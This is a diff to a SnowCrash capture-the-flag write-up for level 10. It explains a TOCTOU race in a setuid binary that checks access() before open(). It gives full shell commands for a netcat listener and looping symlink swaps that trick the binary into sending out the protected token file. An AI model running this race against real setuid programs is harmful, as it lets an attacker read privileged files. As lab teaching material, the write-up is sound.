@@ -1,10 +1,11 @@
-# Level 10 - You TOCTOU me ?
+# Level 10 - You TOCTOU Me?
 
 ## Home Content
 
 - The folder contains a binary named `level10` owned by `flag10`.
 - The SETUID and SETGID bits are set.
-- There is also a file named token owned by `flag10`. Groups and others have no rights on token.
+- There is also a file named `token` owned by `flag10`.
+- Groups and others have no rights on `token`.
 
 ```sh
 level10@SnowCrash:~$ ls -al
@@ -23,10 +24,10 @@ d--x--x--x  1 root    users     340 Aug 30  2015 ..
 ### Arguments
 
 - `level10` takes two arguments, a filename and an host address.
-- The idee seems to be to let `level10` open for us the token file and display its content at the host address.
-- But `level10` program claims that we don't have access to token :(
+- The idee seems to be to let `level10` open for us the `token` file and display its content at the host address.
+- But `level10` program claims that we don't have access to `token` :(
 
-```
+```sh
 level10@SnowCrash:~$ ./level10
 ./level10 file host
 	sends file to host if you have access to it
@@ -58,7 +59,7 @@ v4 = open(v1, 0, 8);
 ```
 
 - The program checks the rights on the file given as argument using the `acces` function.
-- `access` checks wether the real user id (here `level10` ; the effective user id being `flag10`) have read right on a file.
+- `access` checks wether the real user id (here `level10` ; the effective user id being `flag10`) have read rights on a file.
 
 ## `access`
 
@@ -76,24 +77,25 @@ v4 = open(v1, 0, 8);
 ## Time-of-check To Time-of-use (TOCTOU)
 
 - To exploit the race condition we provide as argument a random file on which `level10` has the appropriate rights.
-- Then we switch it with `token` after the check with `access` and prior to the opening.
-- Therefore we run a loop who switch a symbolic link between a genuine file we own and `token` and in parallel we run a loop who run `level10` with the symbolic link as argument.
+- Then we swap it with `token` after the check with `access` but prior to the opening.
+- For this, we run a loop in which a symbolic link switches between a genuine file our own and `token`.
+- In parallel we run a loop who executes `level10` with the symbolic link as argument.
 
-## You TOCTOU me ?
+## You TOCTOU Me?
 
-- We listen in one terminal
+- We listen on a terminal:
 
 ```sh
 $ while true ; do netcat -l 127.0.0.1 6969; done
 ```
 
-- and run the loops in another one.
+- and run the loops on another one.
 
 ```sh
-$ touch /tmp/mykey
-$ while true; do ln -sf /home/user/level10/token /tmp/mykey; ln -sf /tmp/test /tmp/mykey; done &
-$ for i in {1..1000}; do /home/user/level10/level10 /tmp/mykey 127.0.0.1; done
-$ killall bash
+level10@SnowCrash:~$ touch /tmp/mykey
+level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/mykey; ln -sf /tmp/test /tmp/mykey; done &
+level10@SnowCrash:~$ for i in {1..1000}; do /home/user/level10/level10 /tmp/mykey 127.0.0.1; done
+level10@SnowCrash:~$ killall bash
 ```
 
 # Flag
